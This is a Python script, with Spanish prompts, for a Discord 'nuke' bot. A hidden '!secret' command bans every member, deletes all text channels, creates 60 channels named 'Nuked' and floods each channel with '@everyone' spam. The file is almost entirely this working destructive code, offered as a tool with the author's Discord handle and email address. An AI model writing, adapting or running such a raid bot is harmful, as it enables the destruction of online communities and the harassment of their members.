from discord.ext import commands
import discord
import colorama
from colorama import *
import pystyle
import emoji
from pystyle import *
import asyncio
import random




art = f"""{Fore.BLUE}
 __   __     __  __     __  __     ______    
/\ "-.\ \   /\ \/\ \   /\ \/ /    /\  ___\   
\ \ \-.  \  \ \ \_\ \  \ \  _"-.  \ \  __\   
 \ \_\\"\_\  \ \_____\  \ \_\ \_\  \ \_____\ 
  \/_/ \/_/   \/_____/   \/_/\/_/   \/_____/                                                    
"""
print(art)



#Options
print("Atencion, esta version seria la Beta puede que con el Nuke no estes conforme pero recuerda q esta es la Beta, gracias")
print(f"{Fore.BLUE}1- Nuke")
print(f"{Fore.BLUE}2- Contact")
print(f"{Fore.BLUE}3- information")






option = input(f"{Fore.RED}<<{emoji.emojize(':skull:', variant='emoji')}>> ")


if option == '2':
    print("Discord: mr.anomaly_")
    print("email: santino23111@gmail.com")
    input("Ingresa enter, y ejecuta de nueva el script....")
    
if option == '3':
    print("esta verison esta en BETA, significa que todavia no esta completa")
    input("Ingresa enter, y ejecuta de nueva el script....")

if option == '1':
    print("El prefix predeterminado es !, porfavor solo introduce el token")
    token5 = input("Porfavor ingresa el token: ")
    
    
    bot = commands.Bot(command_prefix="!", intents=discord.Intents.all())

    @bot.event
    async def on_ready():
        print(f"Im logged in {bot.user}")
        print(f"Corre el comando Nuke")
        
    @bot.command(name="secret")
    async def secret(ctx):
        await ctx.message.delete()
        await banall(ctx)
        await delete(ctx)
        await channel(ctx)
        await spammer(ctx)
        
        
    async def delete(ctx):
        for channel in ctx.guild.text_channels:
            await channel.delete()   
        
    async def channel(ctx):
        name ="Nuked"
        for _ in range(60):
            await ctx.guild.create_text_channel(name)
        
            
    async def spammer(ctx):
        message = "Haz sido domado Lol @everyone"
        try:
            await ctx.message.delete()
        except discord.errors.NotFound:
            pass
            
        for channel in ctx.guild.text_channels:
            try:
                for _ in range(6): 
                    await channel.send(message)
                    await asyncio.sleep(0.01)  # Espera aleatoria entre 0.5 y 2 segundos
            except discord.errors.Forbidden:
                print(f"No tengo permiso para enviar mensajes en {channel.name}")
            except discord.errors.NotFound:
                print(f"No se pudo encontrar el canal {channel.name}")
            except Exception as e:
                print(f"Ocurrió un error al enviar mensajes en {channel.name}: {e}")


                
    async def banall(ctx):
        try:
            for member in ctx.guild.members:
                await member.ban()
                print("Usuario baneado.")
        except Exception as e:
            print(f"No se pudo banear al miembro {member}: {e}")
            
    
            
    bot.run(token5)
